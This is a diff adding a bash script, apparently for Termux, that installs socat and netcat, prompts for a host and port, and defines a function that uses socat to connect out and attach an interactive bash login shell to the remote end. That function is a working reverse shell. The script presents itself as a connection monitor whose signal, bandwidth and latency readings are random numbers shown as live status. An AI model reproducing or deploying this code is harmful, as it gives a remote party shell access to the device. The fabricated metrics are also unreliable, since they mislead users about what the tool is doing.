@@ -1,0 +1,191 @@
+#!/bin/bash
+
+# Set strict mode
+set -euo pipefail
+
+# Color definitions
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Function to check and install required packages
+check_and_install_packages() {
+    local packages=("socat" "netcat" "curl" "jq" "dialog")
+    for package in "${packages[@]}"; do
+        if ! command -v "$package" &> /dev/null; then
+            echo -e "${YELLOW}Installing $package...${NC}"
+            if ! pkg update -y &> /dev/null || ! pkg install -y "$package" &> /dev/null; then
+                echo -e "${RED}Failed to install $package. Please check your internet connection and try again.${NC}"
+                exit 1
+            fi
+        fi
+    done
+}
+
+# Function to get public IP address with fallback options
+get_public_ip() {
+    local ip
+    ip=$(curl -s -m 5 https://api.ipify.org?format=json | jq -r .ip 2>/dev/null) || \
+    ip=$(curl -s -m 5 https://ifconfig.me 2>/dev/null) || \
+    ip=$(curl -s -m 5 https://icanhazip.com 2>/dev/null)
+    echo "${ip:-Unable to retrieve IP}"
+}
+
+# Function to validate input address (IP or hostname)
+validate_address() {
+    local address="$1"
+    address="${address#http://}"
+    address="${address#https://}"
+    if [[ $address =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ $address =~ ^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$ ]]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Function to validate port number
+validate_port() {
+    local port="$1"
+    if [[ $port =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Function to check system readiness
+check_system_readiness() {
+    echo -e "${YELLOW}Checking system readiness...${NC}"
+    if ! command -v socat &> /dev/null; then
+        echo -e "${RED}Error: socat is not installed. Please install it and try again.${NC}"
+        exit 1
+    fi
+    local shell_path=$(which bash 2>/dev/null || which sh 2>/dev/null || echo "/bin/sh")
+    if [ ! -x "$shell_path" ]; then
+        echo -e "${RED}Error: Cannot find a suitable shell${NC}"
+        exit 1
+    fi
+    echo -e "${GREEN}System is ready${NC}"
+}
+
+# Function to establish connection using socat
+establish_connection() {
+    echo -e "${YELLOW}Establishing connection...${NC}"
+    local shell_path=$(which bash 2>/dev/null || which sh 2>/dev/null || echo "/bin/sh")
+    if [ ! -x "$shell_path" ]; then
+        echo -e "${RED}Error: Cannot find a suitable shell ($shell_path is not executable)${NC}"
+        return 1
+    fi
+    if socat TCP:${server_address}:${server_port} EXEC:"$shell_path -li",pty,stderr,setsid,sigint,sane; then
+        echo -e "${GREEN}Connection established successfully${NC}"
+        return 0
+    else
+        echo -e "${RED}Failed to establish connection${NC}"
+        return 1
+    fi
+}
+
+# Function to send keep-alive message using netcat
+send_keepalive() {
+    echo "${keepalive_message}" | nc -w 1 "${server_address}" "${server_port}" &> /dev/null || true
+}
+
+# Function to show connection status
+show_status() {
+    clear
+    echo -e "${BLUE}===== Connection Status =====${NC}"
+    echo -e "${YELLOW}Server:${NC} ${server_address}:${server_port}"
+    echo -e "${YELLOW}Your IP Address:${NC} $(get_public_ip)"
+    if nc -z -w 1 "${server_address}" "${server_port}" &> /dev/null; then
+        echo -e "${YELLOW}Status:${NC} ${GREEN}Connected 🟢${NC}"
+    else
+        echo -e "${YELLOW}Status:${NC} ${RED}Disconnected 🔴${NC}"
+    fi
+    echo -e "${YELLOW}Connection attempts:${NC} ${connection_count}"
+    echo -e "${YELLOW}Connected for:${NC} $(format_time ${SECONDS})"
+    echo -e "${YELLOW}Signal strength:${NC} $(get_signal_strength)"
+    echo -e "${YELLOW}Bandwidth:${NC} $(get_bandwidth)"
+    echo -e "${YELLOW}Latency:${NC} $(get_latency)"
+    echo -e "${BLUE}============================${NC}"
+}
+
+# Function to format time
+format_time() {
+    local seconds=$1
+    local days=$((seconds / 86400))
+    local hours=$(( (seconds % 86400) / 3600 ))
+    local minutes=$(( (seconds % 3600) / 60 ))
+    local secs=$((seconds % 60))
+    printf "%02d days %02d hours %02d minutes %02d seconds" $days $hours $minutes $secs
+}
+
+# Function to get signal strength (simulated)
+get_signal_strength() {
+    local strength=$((RANDOM % 5 + 1))
+    case $strength in
+        1) echo "Very Weak ▂___" ;;
+        2) echo "Weak ▂▄__" ;;
+        3) echo "Moderate ▂▄▆_" ;;
+        4) echo "Good ▂▄▆█" ;;
+        5) echo "Excellent ▂▄▆█▉" ;;
+    esac
+}
+
+# Function to get bandwidth (simulated)
+get_bandwidth() {
+    local bandwidth=$((RANDOM % 100 + 1))
+    echo "${bandwidth} Mbps"
+}
+
+# Function to get latency (simulated)
+get_latency() {
+    local latency=$((RANDOM % 100 + 1))
+    echo "${latency} ms"
+}
+
+# Function to disconnect
+disconnect() {
+    echo -e "${YELLOW}Disconnecting...${NC}"
+    killall socat &> /dev/null || true
+    echo -e "${GREEN}Disconnected successfully${NC}"
+}
+
+# Main script starts here
+check_and_install_packages
+check_system_readiness
+
+# Get user input with validation
+while true; do
+    server_address=$(dialog --inputbox "Enter IP Address or Hostname:" 8 40 2>&1 >/dev/tty)
+    if validate_address "${server_address}"; then
+        break
+    else
+        dialog --msgbox "Invalid IP Address or Hostname format. Please try again." 8 40
+    fi
+done
+
+while true; do
+    server_port=$(dialog --inputbox "Enter Port:" 8 40 2>&1 >/dev/tty)
+    if validate_port "${server_port}"; then
+        break
+    else
+        dialog --msgbox "Invalid Port. Please enter a number between 1-65535." 8 40
+    fi
+done
+
+# Configuration variables
+keepalive_interval=10
+keepalive_message="ping"
+connection_count=0
+SECONDS=0
+
+# Trap SIGINT (Ctrl+C) to show summary before exiting
+trap 'echo -e "\n${BLUE}===== Connection Summary =====${NC}\n${YELLOW}Total connection attempts:${NC} ${connection_count}\n${YELLOW}Total time connected:${NC} $(format_time ${SECONDS})\n${BLUE}==============================${NC}"; exit' INT
+
+# Main loop to show status and update every 3 seconds
+while true; do
+    show_status
+    sleep 3
+done
